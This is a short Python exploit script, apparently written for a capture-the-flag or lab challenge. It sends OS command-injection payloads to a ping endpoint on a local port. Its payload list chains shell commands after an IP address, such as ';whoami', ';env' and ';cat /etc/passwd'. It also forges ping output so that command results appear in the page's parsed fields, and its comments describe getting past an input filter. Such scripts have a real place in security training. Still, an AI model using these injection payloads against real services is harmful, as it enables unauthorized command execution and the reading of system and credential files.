import requests
import re

url = "http://127.0.0.1:33052/ping"

# Try simpler approaches without triggering filter
# Avoid: $(), backticks, flag keyword, redirections
payloads = [
    # Simple exploration - what can we execute?
    '127.0.0.1;ls',
    '127.0.0.1;pwd',
    '127.0.0.1;whoami',
    '127.0.0.1;hostname',
    
    # Check what's in current directory
    '127.0.0.1;ls -la',
    
    # Check environment without grep
    '127.0.0.1;env',
    
    # Test reading files without redirection
    '127.0.0.1;cat /etc/passwd',
    '127.0.0.1;cat /etc/hostname',
    
    # Try to craft ping output with command output included
    # Using simple string interpolation where possible
    '127.0.0.1;echo "TEST packets transmitted, 1 received, 0% packet loss"',
    
    # Try making the command output BE the first number
    '127.0.0.1;echo SECRET;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Chain commands to see if any output appears
    '127.0.0.1;whoami;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Test with id
    '127.0.0.1;id;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Try just the IP with semicolon
    '127.0.0.1;',
    
    # Multiple echoes
    '127.0.0.1;echo A;echo B;echo "1 packets transmitted, 1 received, 0% packet loss"',
]

print("="*80)
print("Testing Simple Command Execution")
print("="*80)

results = []

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {payload}")
    print("-"*60)
    
    try:
        resp = requests.post(url, data={"ip_address": payload}, timeout=10)
        
        print(f"Status: {resp.status_code}")
        print(f"Response ({len(resp.text)} chars):")
        print(resp.text)
        
        # Extract the displayed values
        match = re.search(r'Packets Transmitted: ([^,]+), Packets Received: ([^,]+), Packet Loss: ([^%]+)%', resp.text)
        if match:
            trans, recv, loss = match.groups()
            print(f"[EXTRACTED] Transmitted: '{trans}', Received: '{recv}', Loss: '{loss}'")
            
        results.append({
            'test': i,
            'payload': payload,
            'response': resp.text,
            'match': match.groups() if match else None
        })
        
    except Exception as e:
        print(f"ERROR: {e}")

# Analysis
print("\n" + "="*80)
print("ANALYSIS: Values for Transmitted field")
print("="*80)
for r in results:
    if r['match']:
        print(f"Test {r['test']:2d}: Transmitted='{r['match'][0]}' | Payload: {r['payload'][:40]}...")

